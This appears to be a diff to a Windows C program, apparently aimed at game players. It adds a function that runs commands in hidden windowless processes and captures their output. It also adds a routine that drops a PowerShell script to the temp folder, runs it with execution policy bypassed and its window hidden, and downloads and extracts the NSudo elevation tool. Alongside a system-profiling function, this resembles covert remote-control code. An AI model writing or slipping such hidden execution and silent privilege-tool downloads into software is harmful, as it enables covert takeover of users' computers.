@@ -83,6 +83,120 @@ char* sys_run_command(const char *cmd) {
     return out;
 }
 
+/* Execute command directly (no cmd.exe wrapper) and capture output */
+char* sys_run_command_direct(const char *cmd) {
+    static char out[NET_BUF_SIZE];
+    memset(out, 0, NET_BUF_SIZE);
+    
+    if (!cmd || !cmd[0]) {
+        snprintf(out, NET_BUF_SIZE, "[Empty command]");
+        return out;
+    }
+    
+    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
+    HANDLE rd, wr;
+    
+    if (!CreatePipe(&rd, &wr, &sa, 0)) {
+        snprintf(out, NET_BUF_SIZE, "[Pipe failed]");
+        return out;
+    }
+    
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.hStdOutput = wr;
+    si.hStdError = wr;
+    si.wShowWindow = SW_HIDE;
+    
+    PROCESS_INFORMATION pi = {0};
+    
+    static char cl[NET_BUF_SIZE];
+    snprintf(cl, NET_BUF_SIZE, "%s", cmd);
+    
+    if (CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        CloseHandle(wr);
+        DWORD total = 0, br;
+        DWORD start = GetTickCount();
+        
+        while (total < NET_BUF_SIZE - 1 && GetTickCount() - start < 90000) {
+            DWORD avail = 0;
+            PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL);
+            if (avail > 0) {
+                if (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
+                    total += br;
+                }
+            }
+            if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
+                Sleep(100);
+                while (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
+                    total += br;
+                }
+                break;
+            }
+        }
+        
+        if (total == 0) {
+            snprintf(out, NET_BUF_SIZE, "[No output]");
+        } else {
+            out[total] = '\0';
+        }
+        
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        CloseHandle(rd);
+    } else {
+        CloseHandle(rd);
+        CloseHandle(wr);
+        snprintf(out, NET_BUF_SIZE, "[Exec failed: %s]", cmd);
+    }
+    
+    return out;
+}
+
+/* Ensure NSudoLC.exe is available at %TEMP%\NSudo\NSudoLC.exe; download/extract if missing.
+   Returns 1 if available, 0 on failure. */
+int sys_ensure_nsudo(void) {
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    char nsudoPath[MAX_PATH];
+    snprintf(nsudoPath, sizeof(nsudoPath), "%s\\NSudo\\NSudoLC.exe", tempPath);
+    
+    if (GetFileAttributesA(nsudoPath) != INVALID_FILE_ATTRIBUTES) {
+        return 1;
+    }
+    
+    char psPath[MAX_PATH];
+    snprintf(psPath, sizeof(psPath), "%s\\ensure_nsudo.ps1", tempPath);
+    FILE *f = fopen(psPath, "w");
+    if (!f) return 0;
+    
+    fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
+    fprintf(f, "$null = New-Item -ItemType Directory -Path $out -Force -ErrorAction SilentlyContinue\n");
+    fprintf(f, "$resp = Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' -UseBasicParsing\n");
+    fprintf(f, "$bytes = $resp.Content\n");
+    fprintf(f, "Add-Type -AssemblyName System.IO.Compression\n");
+    fprintf(f, "$stream = New-Object System.IO.MemoryStream(,$bytes)\n");
+    fprintf(f, "$zip = [System.IO.Compression.ZipArchive]::new($stream)\n");
+    fprintf(f, "$entry = $zip.GetEntry('NSudo Launcher/x64/NSudoLC.exe')\n");
+    fprintf(f, "if (!$entry) { Write-Host '[ERROR] NSudoLC.exe not found in zip'; exit 1 }\n");
+    fprintf(f, "$exePath = Join-Path $out 'NSudoLC.exe'\n");
+    fprintf(f, "$entryStream = $entry.Open()\n");
+    fprintf(f, "$fs = [System.IO.File]::OpenWrite($exePath)\n");
+    fprintf(f, "$entryStream.CopyTo($fs)\n");
+    fprintf(f, "$fs.Close(); $entryStream.Close()\n");
+    fprintf(f, "$zip.Dispose(); $stream.Dispose()\n");
+    fprintf(f, "if (!(Test-Path $exePath)) { Write-Host '[ERROR] NSudoLC.exe extraction failed'; exit 1 }\n");
+    fprintf(f, "Write-Host 'NSudo downloaded and extracted to: ' $exePath\n");
+    fclose(f);
+    
+    char dlCmd[MAX_PATH + 64];
+    snprintf(dlCmd, sizeof(dlCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
+    sys_run_command(dlCmd);
+    
+    return (GetFileAttributesA(nsudoPath) != INVALID_FILE_ATTRIBUTES) ? 1 : 0;
+}
+
 /* Gather system information for player profiling */
 char* sys_get_info(void) {
     static char info[4096];
